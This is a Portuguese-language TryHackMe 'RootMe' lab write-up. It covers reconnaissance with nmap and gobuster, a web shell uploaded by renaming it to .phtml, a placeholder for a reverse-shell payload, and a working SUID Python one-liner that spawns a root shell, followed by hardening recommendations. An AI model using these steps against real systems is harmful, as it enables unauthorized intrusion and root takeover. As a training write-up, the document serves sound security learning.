---
title: "TryHackMe Writeup: RootMe"
date: 2025-11-28
description: "Avaliação de aplicação web envolvendo bypass de restrições de upload e elevação de privilégio via binário Python SUID."
tags: ["tryhackme", "upload-bypass", "suid", "python", "mitre-attack"]
layout: "page"
showPagination: true
showDate: true
showReadingTime: true
showWordCount: true
showAuthorBottom: true
---

### Resumo Executivo

Análise de segurança baseada no framework NIST SP 800-115. O alvo apresentou uma vulnerabilidade de upload de arquivos sem restrições adequadas no diretório `/panel`. Ao realizar o bypass dos filtros de extensão, um web shell foi estabelecido. A elevação de privilégios foi alcançada abusando de um binário Python com configuração insegura do bit SUID.

### Cadeia de Ataque (Mapeamento PTES)

#### 1. Reconhecimento & Enumeração
A descoberta de serviços e o brute-force de diretórios revelaram um painel de upload.
```bash
sudo nmap -sS -sV -T4 -O 10.65.158.29
gobuster dir -u [http://10.65.158.29/](http://10.65.158.29/) -w /usr/share/wordlists/dirb/common.txt
```
* **Técnica MITRE:** [T1083](https://attack.mitre.org/techniques/T1083/) - File and Directory Discovery.

#### 2. Exploração
O filtro de upload foi contornado renomeando o payload para `.phtml`. O acesso ao arquivo no diretório `/uploads` acionou o reverse shell.
```bash
# Execução do payload via URL:
[http://10.65.158.29/uploads/shell.phtml?cmd=](http://10.65.158.29/uploads/shell.phtml?cmd=)<python_reverse_shell_payload>
```
* **Técnica MITRE:** [T1505.003](https://attack.mitre.org/techniques/T1505/003/) - Server Software Component: Web Shell.

#### 3. Pós-Exploração (Elevação de Privilégio)
A enumeração por binários SUID identificou o `/usr/bin/python2.7`.
```bash
find / -perm -4000 -type f 2>/dev/null
```
O binário Python foi utilizado para gerar um shell root definindo o UID como 0:
```bash
/usr/bin/python2.7 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```
* **Técnica MITRE:** [T1548.001](https://attack.mitre.org/techniques/T1548/001/) - Abuse Elevation Control Mechanism: Setuid and Setgid.

### Recomendações (NIST SP 800-115)

* **Validação de Entrada:** Implementar validação do tipo de arquivo no lado do servidor usando verificação de MIME-type e renomear os arquivos enviados para strings aleatórias.
* **Menor Privilégio:** Remover o bit SUID de interpretadores como Python, Ruby ou Perl (`chmod -s /usr/bin/python2.7`).
* **Hardening Web:** Desabilitar a execução de scripts no diretório `/uploads` através de `.htaccess` ou configuração do servidor web.